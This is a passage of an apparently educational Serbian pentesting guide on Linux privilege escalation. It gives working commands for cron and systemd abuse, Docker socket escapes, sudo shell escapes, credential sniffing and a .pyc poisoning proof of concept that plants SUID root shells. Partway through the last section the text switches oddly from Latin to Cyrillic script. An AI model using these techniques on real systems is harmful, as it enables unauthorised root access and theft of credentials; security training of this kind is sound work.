Uobičajeni tok otkrivanja (kao korisnik DB-a sa niskim privilegijama):
- Koristite `pspy` da uočite root cron koji svakog minuta poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potvrdite da možete da upisujete u izvorni klaster (npr. `/var/lib/postgresql/14/main`) i da odredište (`/opt/backups/current`) nakon pokretanja zadatka postaje u vlasništvu root-a.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Ovo funkcioniše zato što `pg_basebackup` čuva bitove režima datoteka prilikom kopiranja klastera; kada ga pokrene root, odredišne datoteke nasleđuju **vlasništvo root-a + SUID/SGID koje bira napadač**. Svaka slična privilegovana rutina za pravljenje rezervnih kopija/kopiranje koja čuva dozvole i upisuje u lokaciju iz koje se mogu izvršavati datoteke podložna je napadu.

### Nevidljivi cron poslovi

Moguće je napraviti cron posao tako što se iza komentara stavi znak za povratak na početak reda (carriage return), bez znaka za novi red, i cron posao će raditi. Primer (obratite pažnju na znak za povratak na početak reda):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Da biste otkrili ovu vrstu prikrivenog unosa, pregledajte cron datoteke pomoću alata koji prikazuju kontrolne znakove:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Usluge

### `.service` fajlovi u koje može da se upisuje

Proveri da li možeš da upisuješ u neki `.service` fajl. Ako možeš, **možeš da ga izmeniš** tako da **izvršava** tvoj **backdoor kada se** servis **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćeš morati da sačekaš dok se mašina ne restartuje).\
Na primer, napravi backdoor unutar .service fajla pomoću **`ExecStart=/tmp/script.sh`**

### Binarne datoteke servisa u koje može da se upisuje

Imaj na umu da ako imaš **dozvole za upis u binarne datoteke koje izvršavaju servisi**, možeš da ih zameniš backdoor-ima, tako da će se backdoor-i izvršiti kada se servisi ponovo pokrenu.

### systemd PATH - Relativne putanje

Možeš da vidiš PATH koji koristi **systemd** pomoću:

```bash
systemctl show-environment
```

Ako utvrdite da možete da **pišete** u bilo koji direktorijum u putanji, možda ćete moći da **eskalirate privilegije**. Potrebno je da potražite **relativne putanje koje se koriste u konfiguracionim datotekama servisa**, kao što su:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Zatim napravite **izvršnu datoteku** sa **istim imenom kao binarna datoteka sa relativnom putanjom** unutar systemd PATH direktorijuma u koji možete da upisujete. Kada se od servisa zatraži da izvrši ranjivu radnju (**Start**, **Stop**, **Reload**), izvršiće se vaš **backdoor** (neprivilegovani korisnici obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete da koristite `sudo -l`).

**Više o servisima možete da saznate pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit datoteke čija se imena završavaju sa `**.timer**` i koje kontrolišu `**.service**` datoteke ili događaje. **Tajmeri** mogu da se koriste kao alternativa za cron jer imaju ugrađenu podršku za kalendarske i monotone vremenske događaje, a mogu i da se pokreću asinhrono.

Sve tajmere možete da izlistate pomoću:

```bash
systemctl list-timers --all
```

### Tajmeri koje je moguće menjati

Ako možete da izmenite tajmer, možete da podesite da izvršava neke jedinice systemd.unit (kao što su `.service` ili `.target`).

```bash
Unit=backdoor.service
```

U dokumentaciji možete pročitati šta je jedinica:

> Jedinica koja se aktivira kada istekne ovaj tajmer. Argument je naziv jedinice bez sufiksa „.timer“. Ako nije naveden, podrazumevano se koristi servis istog naziva kao jedinica tajmera, ali bez sufiksa. (Pogledajte iznad.) Preporučuje se da naziv aktivirane jedinice i naziv jedinice tajmera budu isti, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, potrebno je da:

- Pronađete neku systemd jedinicu (kao što je `.service`) koja **izvršava binarnu datoteku u koju može da se upisuje**
- Pronađete neku systemd jedinicu koja **izvršava relativnu putanju** i imate **dozvole za upis u systemd PATH** (da biste se predstavili kao ta izvršna datoteka)

**Saznajte više o tajmerima pomoću komande `man systemd.timer`.**

### **Omogućavanje tajmera**

Da biste omogućili tajmer, potrebne su vam root privilegije i treba da izvršite:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Imajte na umu da se **timer** **aktivira** kreiranjem simboličke veze do njega na putanji `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istoj ili različitim mašinama u okviru modela klijent-server. Za međuračunarsku komunikaciju koriste standardne Unix datoteke deskriptora i podešavaju se pomoću datoteka `.socket`.<sup>[[14]](#references)</sup>

Sockets se mogu konfigurisati pomoću datoteka `.socket`.

**Saznajte više o sockets pomoću `man systemd.socket`.** U ovoj datoteci može se konfigurisati nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali se koriste da **naznače gde će socket osluškivati** (putanju datoteke AF_UNIX socket, IPv4/6 adresu i/ili broj porta na kom će osluškivati itd.)
- `Accept`: Prima logičku vrednost. Ako je **true**, **pokreće se instanca servisa za svaku dolaznu vezu** i prosleđuje joj se samo socket veze. Ako je **false**, sami socketi koji osluškuju **prosleđuju se pokrenutoj service jedinici**, a za sve veze pokreće se samo jedna service jedinica. Ova vrednost se zanemaruje za datagram sockets i FIFO, gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevana vrednost je false**. Zbog performansi, preporučuje se da se novi daemon-i pišu tako da rade sa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Primaju jednu ili više komandnih linija koje se **izvršavaju pre** ili **nakon** što se socketi/FIFO koji osluškuju **kreiraju** i povežu, tim redosledom. Prvi token komandne linije mora biti apsolutna putanja do datoteke, a zatim slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **nakon** što se socketi/FIFO koji osluškuju **zatvore** i uklone, tim redosledom.
- `Service`: Navodi naziv **service** jedinice koju treba **aktivirati** pri **dolaznom saobraćaju**. Ova postavka je dozvoljena samo za sockets sa `Accept=no`. Podrazumevano se koristi service jedinica istog naziva kao socket (menja se sufiks). U većini slučajeva nije potrebno koristiti ovu opciju.

### Zapisive datoteke .socket

Ako pronađete zapisivu datoteku `.socket`, možete na početak odeljka `[Socket]` **dodati** nešto poput: `ExecStartPre=/home/kali/sys/backdoor`, pa će se backdoor izvršiti pre kreiranja socketa. Zato ćete **verovatno morati da sačekate da se mašina ponovo pokrene.**\
_Imajte na umu da sistem mora da koristi konfiguraciju te socket datoteke, inače se backdoor neće izvršiti_

### Socket activation + zapisiva putanja jedinice (kreiranje nedostajućeg servisa)

Još jedna pogrešna konfiguracija sa velikim uticajem je:

- socket jedinica sa `Accept=no` i `Service=<name>.service`
- nedostaje referencirana service jedinica
- napadač može da piše u `/etc/systemd/system` (ili neku drugu putanju za pretragu jedinica)

U tom slučaju napadač može da kreira `<name>.service`, a zatim pokrene saobraćaj ka socketu da bi systemd učitao novu service jedinicu i izvršio je kao root.

Kratak tok:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Soketi u koje je moguće upisivati

Ako **identifikujete bilo koji soket u koji je moguće upisivati** (_ovde govorimo o Unix Sockets, a ne o `.socket` konfiguracionim datotekama_), **možete komunicirati** sa tim soketom i možda iskoristiti ranjivost.

### Enumerisanje Unix Sockets

```bash
netstat -a -p --unix
```

### Sirova veza

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Primer eksploatacije:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketi

Imajte na umu da neki **soketi mogu osluškivati** HTTP zahteve (_ne mislim na .socket datoteke, već na datoteke koje funkcionišu kao Unix soketi_). Ovo možete proveriti pomoću:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Ako socket **odgovara na HTTP** zahtev, možete da **komunicirate** s njim i možda **iskoristite neku ranjivost**.

### Docker socket sa dozvolom za upis

Docker socket, koji se često nalazi na putanji `/var/run/docker.sock`, kritična je datoteka koju treba zaštititi. Podrazumevano, dozvolu za upis imaju korisnik `root` i članovi grupe `docker`. Pristup za upis ovom socketu može dovesti do podizanja privilegija. Evo kako se to može uraditi, kao i alternativnih metoda ako Docker CLI nije dostupan.

#### **Podizanje privilegija pomoću Docker CLI-ja**

Ako imate dozvolu za upis u Docker socket, privilegije možete podići pomoću sledećih komandi:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ove komande vam omogućavaju da pokrenete kontejner sa pristupom fajl sistemu hosta na nivou root korisnika.

#### **Direktno korišćenje Docker API-ja**

Ako Docker CLI nije dostupan, Docker socket se i dalje može zloupotrebiti pomoću sirovih HTTP zahteva preko Unix socketa. Najpouzdaniji postupak je:

- kreirati dugotrajni pomoćni kontejner sa bind mount-om root direktorijuma hosta
- pokrenuti ga
- kreirati `exec` instancu unutar tog pomoćnog kontejnera
- pokrenuti `exec` instancu i pročitati izlaz preko API-ja

**Izlistajte Docker image-e**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Kreirajte i pokrenite pomoćni kontejner**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Kreirajte exec instancu**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Pokrenite exec instancu i pročitajte izlaz**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ovaj obrazac je obično pouzdaniji od pokušaja da ručno upravljate komandom `attach` pomoću `socat` ili `nc -U`. Kada možete da napravite pomoćni kontejner sa `/:/host`, možete da koristite dodatne instance komande `exec` za čitanje datoteka kao što je `/host/root/...`, dodavanje SSH ključeva u `/host/root/.ssh` ili izmenu datoteka za pokretanje hosta.

### Ostalo

Imajte na umu da, ako imate dozvole za pisanje u docker socket zato što ste **član grupe `docker`**, imate [**više načina da eskalirate privilegije**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API osluškuje na portu**, možete da ga kompromitujete](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina da izađete iz kontejnera ili zloupotrebite container runtime za eskalaciju privilegija** na stranici:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacija privilegija pomoću Containerd (ctr)

Ako otkrijete da možete da koristite komandu **`ctr`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacija privilegija pomoću **RunC**

Ako otkrijete da možete da koristite komandu **`runc`**, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticirani **sistem za međuprocesnu komunikaciju (IPC)** koji aplikacijama omogućava efikasnu interakciju i razmenu podataka. Osmišljen za moderne Linux sisteme, pruža robustan okvir za različite oblike komunikacije između aplikacija.<sup>[[16]](#references)</sup>

Ovaj sistem je prilagodljiv i podržava osnovni IPC, koji unapređuje razmenu podataka između procesa na način sličan **unapređenim UNIX domain socketima**. Takođe omogućava emitovanje događaja ili signala, čime se olakšava neometana integracija sistemskih komponenti. Na primer, signal Bluetooth demona o dolaznom pozivu može da navede muzički plejer da utiša zvuk, čime se poboljšava korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, što pojednostavljuje zahteve za uslugama i pozivanje metoda između aplikacija i olakšava procese koji su ranije bili složeni.

D-Bus koristi **model dozvoli/zabrani** za upravljanje dozvolama za poruke (pozivi metoda, emitovanje signala itd.), na osnovu kumulativnog dejstva pravila koja se podudaraju. Ove smernice određuju interakcije sa magistralom i mogu omogućiti eskalaciju privilegija ako se te dozvole iskoriste.

Primer takve smernice u datoteci `/etc/dbus-1/system.d/wpa_supplicant.conf` prikazuje dozvole za root korisnika da poseduje `fi.w1.wpa_supplicant1`, šalje mu poruke i prima ih od njega.

Smernice bez navedenog korisnika ili grupe primenjuju se globalno, dok se smernice u „default“ kontekstu primenjuju na sve slučajeve koji nisu obuhvaćeni drugim konkretnim smernicama.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Naučite kako da enumerišete i exploitujete D-Bus komunikaciju ovde:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Opšta enumeracija

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Ako aktivna stavka u `/etc/inetd.conf` pokreće GNU Inetutils `telnetd` kao root, proverite verziju konfigurisane binarne datoteke i lokalni listener, čak i kada je port vezan samo za loopback. GNU Inetutils verzije od 1.9.3 do 2.7 imale su [zaobilaženje telnet autentifikacije](https://seclists.org/oss-sec/2026/q1/89), pri kojem je klijentski prosleđeni `USER` stizao do `login -f` (CVE-2026-24061). Proces ili niz verzije samo su indikatori; proverite status zakrpe dobavljača i stvarni daemon pre nego što zaključite da je sistem izložen. Više detalja potražite u [vodiču za Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Brza trijaža odlaznog filtriranja

Ako host može da izvršava komande, ali callbacks ne uspevaju, brzo razdvojite filtriranje DNS-a, transporta, proxy-ja i ruta:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima ranije niste mogli da stupite u interakciju, pre nego što joj pristupite:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasifikujte listenere prema adresi na koju su vezani:

- `0.0.0.0` / `[::]`: dostupni na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: dostupni samo lokalno (dobri kandidati za tunnel/forward).
- Konkretne interne IP adrese (npr. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupne samo iz internih segmenata.

### Tok rada za trijažu lokalno dostupnih servisa

Kada kompromitujete host, servisi vezani za `127.0.0.1` često prvi put postaju dostupni iz vaše shell sesije. Brz lokalni tok rada je:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS kao mrežni skener (režim samo za mrežu)

Pored lokalnih provera eskalacije privilegija, linPEAS može da radi kao namenski mrežni skener. Koristi dostupne binarne datoteke iz `$PATH` (obično `fping`, `ping`, `nc`, `ncat`) i ne instalira dodatne alate.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Ako prosledite `-d`, `-p` ili `-i` bez `-t`, linPEAS se ponaša kao čisti mrežni skener (preskačući ostale provere eskalacije privilegija).

### Sniffing

Proverite da li možete da presrećete mrežni saobraćaj. Ako možete, možda ćete uspeti da pribavite neke kredencijale.

```
timeout 1 tcpdump
```

Brze praktične provere:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) je naročito vredan u post-exploitation fazi jer mnogi servisi dostupni samo interno tamo izlažu tokene/kolačiće/akreditive:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Zabeležite sada, parsirajte kasnije:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Korisnici

### Opšta enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji su **korisnici** na sistemima, koji mogu da obave **login** i koji imaju **root privilegije**:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Veliki UID

Neke verzije Linux-a bile su pogođene greškom koja korisnicima sa **UID > INT_MAX** omogućava eskalaciju privilegija. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Iskoristite je** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla omogućiti root privilegije:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Klipbord

Proverite da li se u klipbordu nalazi nešto zanimljivo (ako je moguće)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Politika lozinki

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Poznate lozinke

Ako **znate neku lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da pravite mnogo buke, a na računaru postoje binarni fajlovi `su` i `timeout`, možete pokušati da brute-force-ujete korisnike pomoću [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da brute-force-uje korisnike.

## Zloupotreba upisivog PATH-a

### $PATH

Ako utvrdite da možete **da upisujete u neku fasciklu iz $PATH-a**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u fascikli u koju možete da upisujete**, sa nazivom neke komande koju će izvršiti drugi korisnik (idealno root) i koja se **ne učitava iz fascikle koja se u $PATH-u nalazi pre vaše fascikle u koju možete da upisujete**.

### SUDO i SUID

Možda vam je dozvoljeno da izvršavate neke komande pomoću sudo-a ili one mogu imati suid bit. Proverite to pomoću:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Neke **neočekivane komande omogućavaju čitanje i/ili upisivanje u datoteke, pa čak i izvršavanje komande**.<sup>[[8]](#references)</sup> Na primer:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo konfiguracija može korisniku da omogući izvršavanje neke komande sa privilegijama drugog korisnika bez poznavanja lozinke.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

U ovom primeru korisnik demo može da pokrene vim kao root; sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem sh.

```
sudo vim -c '!sh'
```

### Nequoted Bash poređenje u sudo skripti

U Bash-u je desna strana izraza `[[ "$protected" == $candidate ]]` obrazac. Ako root-capable sudo skripta popunjava `candidate` iz datoteke koju kontroliše pozivalac, vrednost poput `prefix*` može da se podudari s početkom zaštićenog stringa. Različite putanje uspeha i greške mogu tako da otkriju prefix oracle. Stavite desnu stranu pod navodnike (`[[ "$protected" == "$candidate" ]]`) kada se očekuje doslovno poređenje. Pre nego što nequoted poređenje smatrate iskoristivim, proverite stvarne sudo argumente, poreklo ulaza i ponašanje grana koje se može uočiti. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) definiše ovo ponašanje obrazaca.

### PrusaSlicer projektne datoteke pod sudo

Neograničenu root-capable sudo dozvolu za `prusaslicer` ili `prusa-slicer` treba proveriti ako pozivalac može da izabere `.3mf` projekat koji se obrađuje. Projekat može sadržati post-processing skriptu koja se pokreće pri izvozu G-code-a; posebno napravljeni projekti mogli bi da izvrše komande u PrusaSlicer-u do verzije 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Pre nego što zaključite da je moguće preći granicu privilegija, proverite efektivno sudo pravilo, verziju binarne datoteke i zakrpe dobavljača, izvor projekta i da li se relevantna putanja izvoza zaista pokreće. Fiksni argument projekta ili efektivna politika `NOEXEC` mogu promeniti ishod. Samo prisustvo slicer-a ne dokazuje putanju za eskalaciju privilegija.

### SETENV

Ova direktiva omогуćава korisniku da **postavi promenljivu okruženja** prilikom izvršavanja nečega:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** za učitavanje proizvoljne Python biblioteke tokom izvršavanja skripte kao root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Trovanje upisivog `__pycache__` / `.pyc` pri importovanju u Python-u dozvoljenom preko sudo

Ako **Python skripta dozvoljena preko sudo** importuje modul čiji direktorijum paketa sadrži **upisiv `__pycache__`**, možda ćete moći da zamenite keširani `.pyc` i izvršite kod kao privilegovani korisnik pri sledećem importovanju.<sup>[[30]](#references)</sup>

- Zašto funkcioniše:
  - CPython čuva keš bajtkoda u `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter proverava **zaglavlje** (magic + metapodatke vremenske oznake/hash-a povezane sa izvornim kodom), a zatim izvršava marshalled code object sačuvan posle tog zaglavlja.
  - Ako možete da **obrišete i ponovo napravite** keširanu datoteku zato što je direktorijum upisiv, `.pyc` u vlasništvu root-a koji nije upisiv i dalje može biti zamenjen.
- Uobičajena putanja:
  - `sudo -l` prikazuje Python skriptu ili omotač koji možete pokrenuti kao root.
  - Ta skripta importuje lokalni modul iz `/opt/app/`, `/usr/local/lib/...` itd.
  - Direktorijum `__pycache__` importovanog modula upisiv je za vašeg korisnika ili za sve korisnike.

Brza enumeracija:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ako možete da pregledate privilegovanu skriptu, utvrdite uvezene module i putanju njihovog keša:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Tok zloupotrebe:

1. Jednom pokrenite skriptu dozvoljenu preko sudo-a kako bi Python napravio legitimnu keš datoteku ako već ne postoji.
2. Pročitajte prvih 16 bajtova iz legitimne `.pyc` datoteke i ponovo ih iskoristite u kompromitovanoj datoteci.
3. Kompajlirajte payload code object, uradite `marshal.dumps(...)`, obrišite originalnu keš datoteku i ponovo je napravite koristeći originalno zaglavlje i svoj zlonamerni bytecode.
4. Ponovo pokrenite skriptu dozvoljenu preko sudo-a kako bi se pri importu izvršio vaš payload kao root.

Važne napomene:

- Ponovna upotreba originalnog zaglavlja je ključna jer Python proverava metapodatke keša u odnosu na izvornu datoteku, a ne da li se telo bytecode-a zaista podudara sa izvornim kodom.
- Ovo je posebno korisno kada je izvorna datoteka u vlasništvu root-a i nije upisiva, ali je direktorijum koji sadrži `__pycache__` upisiv.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` sprečavaju Python da zapisuje nove `.pyc` datoteke; **ne** sprečavaju ga da učita već postojeći, važeći keš koji je zamenio napadač. Ključna granica je ta da ли корисник са нижим привилегијама може да замени кеш који ће привилеговани import прихватити. Python проверава метаподатке временске ознаке/величине или хеша пре учитавања кешираног bytecode-а. Погледајте [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) и [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Минимални облик proof-of-concept-а:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Ojačavanje:

- Uverite se da nijedan direktorijum u privilegovanoj Python putanji za uvoz nije upisiv za korisnike sa nižim privilegijama, uključujući `__pycache__`.
